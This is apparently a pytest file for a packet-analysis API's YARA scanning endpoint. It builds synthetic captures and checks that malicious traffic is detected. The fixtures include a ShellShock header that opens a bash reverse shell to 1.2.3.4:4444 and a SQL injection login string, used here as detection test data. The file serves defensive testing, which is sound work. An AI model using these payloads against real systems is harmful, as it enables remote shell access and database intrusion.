"""GET /api/yara/{upload_id} 테스트."""
import uuid
import pytest
from fastapi.testclient import TestClient


def _make_capture_with_packets(client, hex_payloads: list[str]):
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))
    from store.session_store import ParsedCapture
    from models.session import SessionModel
    from models.packet import PacketRecord

    sid = str(uuid.uuid4())
    session = SessionModel(
        session_id=sid, src_ip="192.168.1.1", dst_ip="8.8.8.8",
        src_port=12345, dst_port=80, protocol="TCP",
        start_ts=1748000000.0, end_ts=1748000010.0,
        bytes_sent=1000, bytes_recv=500, packet_count=len(hex_payloads),
        payload_length=800, meta={},
    )
    packets = [
        PacketRecord(ts=float(1748000000 + i), direction="fwd", proto="TCP",
                     seq=i, ack=0, flags="PSH", length=len(h)//2,
                     payload_hex=h, payload_len=len(h)//2)
        for i, h in enumerate(hex_payloads)
    ]
    capture = ParsedCapture(
        sessions=[session], source_type="pcap",
        attacks=[], target_ip="8.8.8.8",
    )
    capture.packet_map = {sid: packets}
    uid = str(uuid.uuid4())
    client.app.state.session_store.put(uid, capture)
    return uid


def _to_hex(s: str) -> str:
    return s.encode().hex()


def test_yara_no_match(api_client):
    """악성 패턴 없는 페이로드 → match_count=0."""
    payload_hex = _to_hex("GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
    uid = _make_capture_with_packets(api_client, [payload_hex])
    resp = api_client.get(f"/api/yara/{uid}")
    assert resp.status_code == 200
    data = resp.json()
    assert "available" in data
    assert "matches" in data
    if data["available"]:
        assert data["match_count"] == 0


def test_yara_shellshock_match(api_client):
    """ShellShock 페이로드 → 매치 또는 unavailable."""
    payload_hex = _to_hex(
        "GET /cgi-bin/test HTTP/1.1\r\n"
        "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\r\n\r\n"
    )
    uid = _make_capture_with_packets(api_client, [payload_hex])
    resp = api_client.get(f"/api/yara/{uid}")
    assert resp.status_code == 200
    data = resp.json()
    if data["available"]:
        rules = [m["rule"] for m in data["matches"]]
        assert "ShellShock" in rules or "ReverseShell" in rules


def test_yara_sql_injection(api_client):
    """SQL Injection 페이로드 → 매치 또는 unavailable."""
    payload_hex = _to_hex(
        "GET /login?user=admin' OR '1'='1&pass=x HTTP/1.1\r\n\r\n"
    )
    uid = _make_capture_with_packets(api_client, [payload_hex])
    resp = api_client.get(f"/api/yara/{uid}")
    assert resp.status_code == 200
    data = resp.json()
    if data["available"]:
        rules = [m["rule"] for m in data["matches"]]
        assert "SQLInjection" in rules


def test_yara_invalid_uuid(api_client):
    resp = api_client.get("/api/yara/not-a-uuid")
    assert resp.status_code == 400


def test_yara_not_found(api_client):
    resp = api_client.get(f"/api/yara/{uuid.uuid4()}")
    assert resp.status_code == 404
